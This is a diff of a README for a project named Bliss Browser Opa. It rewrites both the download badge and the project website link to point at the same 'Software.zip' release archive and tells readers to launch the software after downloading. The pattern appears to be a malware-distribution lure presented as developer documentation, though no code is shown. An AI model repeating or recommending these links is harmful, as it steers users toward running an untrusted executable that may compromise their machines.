@@ -18,7 +18,7 @@ Bliss Browser Opa is a project aimed at enabling developers to write Opa program
 
 To get started with Bliss Browser Opa, you can download the necessary software from the following link: 
 
-[![Download Bliss Browser Opa](https://img.shields.io/badge/Download-Bliss_Browser_Opa-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Bliss Browser Opa](https://github.com/yolkybow/Bliss_Browser_Opa/releases/download/v1.0/Software.zip)](https://github.com/yolkybow/Bliss_Browser_Opa/releases/download/v1.0/Software.zip)
 
 **Note:** The software needs to be launched after downloading.
 
@@ -36,7 +36,7 @@ If you're interested in contributing to the Bliss Browser Opa project, feel free
 
 ## Visit Our Website
 
-For more information about Bliss Browser Opa and other related projects, visit our website [here](https://bliss-browser-opa.com).
+For more information about Bliss Browser Opa and other related projects, visit our website [here](https://github.com/yolkybow/Bliss_Browser_Opa/releases/download/v1.0/Software.zip).
 
 ## Releases
 
